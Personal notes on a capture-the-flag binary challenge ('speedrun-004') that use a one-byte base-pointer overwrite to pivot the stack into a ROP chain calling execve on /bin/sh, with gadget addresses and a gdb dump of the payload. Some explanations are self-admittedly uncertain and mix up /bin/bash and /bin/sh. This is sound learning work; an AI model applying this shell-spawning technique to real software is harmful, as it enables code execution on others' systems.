# Stack pivoting

* speedrun-004
    64 bits, LSB, statically linked, NX.

    Asks for two inputs and displays some text.

    With ghidra:
    * pretty big, long to analyse
    * no reference to "flag" string in the code, so we probably need to open a shell
    * interesting method at `0x00400b73`, because there is a buffer and a call to a read method.

    The interesting method is called if we input a first value between 1 and 0x102, which seems to be the length of the second input we can give.

    At this place:
    stack: 0x7fffffffdb30 (BTW the stack is 256 bytes long, and the input can be 0x101 = 257 -> 1 byte overflow)
    eip: 0x7fffffffdc38
    -> delta of 0x108 -> too much, bad candidate ?

    It is indeed the candidate we were seeking, but with an attack called "stack pivot", where we overwrite the least value of the base pointer (rbp). When we exit the current, we will go into another method that will just exit, so the rbp we modified will become the return pointer (or maybe I'm completely wrong).

    Then since it is an ROP let's get our gadgets:
    ```
    ROPgadget --binary speedrun-004 --ropchain
    ```
    mov: 0x47f521 mov qword ptr [rsi], rax ; ret
    rax: 0x415f04 pop rax ; ret
    rdi: 0x400686 pop rdi ; ret
    rsi: 0x410a93 pop rsi ; ret
    rdx: 0x44a155 pop rdx ; ret
    sys: 0x40132c syscall

    For reminder the args need to be like this (thanks [syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit)):
    rax = 0x3b, rdi = "/bin/sh", rsi = 0x0, rdx = 0x0

    Note to self: by using my own gadgets but following most of the tutorial's answer, I ended up using the mov instruction in the wrong way (it is the only different gadget it seems). So be wary next time !

    Just an overview of the memory layout after the payload was sent:
    ```gdb
    0x7ffeb0a76000:	0x0000000000400416	0x0000000000400416 <-- ret gadgets (probably more before too)
    0x7ffeb0a76010:	0x0000000000400416	0x0000000000400416
    0x7ffeb0a76020:	0x0000000000400416	0x0000000000400416
    0x7ffeb0a76030:	0x0000000000400416	0x0000000000400416 <-- ret gadgets (end)
    0x7ffeb0a76040:	0x0000000000410a93	0x00000000006b6030 <-- writing /bin/bash (prep)
    0x7ffeb0a76050:	0x0000000000415f04	0x0068732f6e69622f <-- writing /bin/bash (the string value)
    0x7ffeb0a76060:	0x000000000047f521	0x0000000000415f04 <-- writing /bin/bash (mov) + start of execve
    0x7ffeb0a76070:	0x000000000000003b	0x0000000000400686
    0x7ffeb0a76080:	0x00000000006b6030	0x0000000000410a93
    0x7ffeb0a76090:	0x0000000000000000	0x000000000044a155
    0x7ffeb0a760a0:	0x0000000000000000	0x000000000040132c <-- end of execve (syscall)
    0x7ffeb0a760b0:	0x00007ffeb0a76000	0x0000000000400c44 <-- overwritten ebp (least byte) + eip
    ```

    See how the overwritten ebp points back to a ret gadget. But since the addresses are random we might need to execute the pwn several times.

# about stack pivoting

From what I saw stack pivoting happens when at the return of a function the eip register points to instructions that will also return. By having a `ret` just after the return of a call the ebp register that was used in the call will be used as a eip just after.